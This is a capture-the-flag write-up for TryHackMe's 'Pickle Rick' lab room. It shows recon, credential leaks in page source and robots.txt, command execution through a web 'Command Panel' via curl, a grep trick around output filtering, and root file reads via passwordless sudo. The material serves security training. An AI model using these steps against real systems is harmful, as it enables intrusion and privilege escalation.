# TryHackMe Room — Pickle Rick

**Room:** Pickle Rick (https://tryhackme.com/room/picklerick)
**Platform:** TryHackMe — free room (AttackBox free tier)
**Solved:** 26 November 2026 — Room completed 100%, all 3 questions correct, 90 points earned, streak 3 days.
**Target:** 10.49.132.122 (lab machine), AttackBox 10.49.189.173. Both machines terminated after the room.

## Vulnerability Type
Web application security — information disclosure (credentials in page source / robots.txt) and remote command execution through an unauthenticated command panel, plus privilege escalation via passwordless sudo.

## Objective
Help Morty: find the three ingredients Rick needs for his potion.

## Solution

### 1. Recon
- `nmap -sV 10.49.132.122` → 22/tcp SSH (OpenSSH 8.2p1 Ubuntu), 80/tcp HTTP (Apache 2.4.41 Ubuntu).
- `gobuster dir -u http://10.49.132.122 -w /usr/share/wordlists/dirb/common.txt` → /assets, /index.html, /robots.txt, /server-status (403).
- With `-x php` also found: /login.php, /portal.php, /denied.php.
- Opening the site showed: "Rick is sup4r cool / Help Morty!"

### 2. Username and password (information disclosure)
- `curl -s http://10.49.132.122` — the page source HTML comment contains the username: `R1ckRul3s`.
- `curl -s http://10.49.132.122/robots.txt` — contains the login password: `Wubbalubbadubdub`.

### 3. Login and command execution (RCE)
- Logged in at /login.php with `R1ckRul3s` / `Wubbalubbadubdub`, then opened /portal.php — a "Command Panel" form (POST field `command`, submit `Execute`).
- `curl -s -b c.txt -d "command=ls" http://10.49.132.122/portal.php` listed: Sup3rS3cretPickl3Ingred.txt, assets, clue.txt, denied.php, index.html, login.php, portal.php, robots.txt.
- `p id` → uid=33(www-data). Note: `cat`, `head` and `more` gave no output through the portal; file contents were read with `grep . <file>` instead. Spaces in commands were sent as `+`.

### 4. First ingredient
- `grep . Sup3rS3cretPickl3Ingred.txt` → `mr. meeseek hair` → **Correct Answer**.
- `grep . clue.txt` → "Look around the file system for the other ingredient."

### 5. Second ingredient
- `ls -la /home/rick` → a file named `second ingredients` (13 bytes).
- `grep . /home/rick/second*` → `1 jerry tear` → **Correct Answer**.

### 6. Last ingredient (privilege escalation)
- `sudo -l` → "User www-data may run the following commands: (ALL) NOPASSWD: ALL".
- `sudo ls -la /root` → `3rd.txt` (29 bytes).
- `sudo grep . /root/3rd.txt` → "3rd ingredients: fleeb juice" → answer `fleeb juice` → **Correct Answer**.

## Practical Explanation
The site leaked its own login credentials in two public places — a username hidden in an HTML comment and a password sitting in robots.txt. That gave access to a command panel that runs whatever the user types as the web-server user (www-data). From there, reading files gave the first two ingredients, and the real privilege-escalation lesson was `sudo -l`: www-data could run ANY command as root without a password, so reading /root/3rd.txt gave the last ingredient. In a real system, each of these is a separate serious flaw: credentials in source/robots.txt, unauthenticated command execution, and passwordless sudo for a service account.

## Lessons Learned
- Always read page source and robots.txt — credentials and hints are often left in plain sight.
- A command-injection panel is full RCE: treat it as a shell, not a form.
- `sudo -l` is one of the first privilege-escalation checks on any Linux target — NOPASSWD: ALL for a service account means instant root.
- When one command (`cat`) gives no output through a web shell, try another reader (`grep .`) — the filter is on the output, not the access.
